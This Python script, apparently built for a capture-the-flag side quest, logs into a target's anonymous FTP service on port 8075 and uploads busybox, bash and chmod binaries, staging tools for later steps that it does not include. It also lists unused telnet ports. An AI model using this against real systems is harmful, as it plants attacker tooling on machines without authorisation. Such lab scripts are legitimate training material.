#!/usr/bin/env python
# Sidequest4 exploit script
import argparse
from ftplib import FTP
from sys import exit
from termcolor import colored
import time

class MachineInstance:
    def __init__(self, address=None, port=None):
        self.address = address
        self.port = port

class Session:
    def __init__(self, user=None, password=None):
        self.user = user
        self.password = password

class File:
    def __init__(self, name=None):
        self.name = name

def ftpUpload(instance, session, file):
    address = instance.address
    port = instance.port
    fileName = file.name
    success_icon = colored("[✔]", 'green')
    try:
        with FTP() as ftp:
            ftp.connect(address, port)
            ftp.login(user=session.user, passwd=session.password)
            ftp.set_pasv(False)
            # upload the binaries
            with open(fileName, 'rb') as file:
                remoteFileDestination = f"{fileName.split('/')[-1]}"
                ftp.storbinary(f"STOR {remoteFileDestination}", file)
            print(f"{success_icon} {fileName.split('/')[-1]} uploaded successfully")
    except Exception as e:
        print(f"Error Uploading File: {e}")


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='Sidequest 3 pwn script')
        parser.add_argument("--address", "-a", dest="address", required=True, help="Server IP Address")
        args = parser.parse_args()
        address = args.address

        openPorts = {
            "ftp": 8075,
            "vimTelnet": 8085,
            "nanoTelnet": 8095,
            "rootTelnet": 8065,
        }
        filePaths={
            "busybox":"binaries/busybox",
            "bash":"binaries/bash",
            "chmod":"binaries/chmod",
        }
        

        try:
            # First, let's upload the files
            sessionData = Session(user="anonymous", password="anonymous@")
            ftpPort = openPorts["ftp"]
            machineInstance = MachineInstance(address=address, port=ftpPort)
            filePath = File('binaries/busybox')
            success_icon = colored("[✔]", 'green')
            print(f"{success_icon} Uploading Files Now")
            for files in filePaths.keys():
                ftpUpload(machineInstance, sessionData, File(filePaths[files]))
        except Exception as e:
            print(f"Error: {e}")
        except KeyboardInterrupt:
            exit(0)

    except Exception as e:
        print(f"Error: {e}")
    except KeyboardInterrupt:
        exit(0)
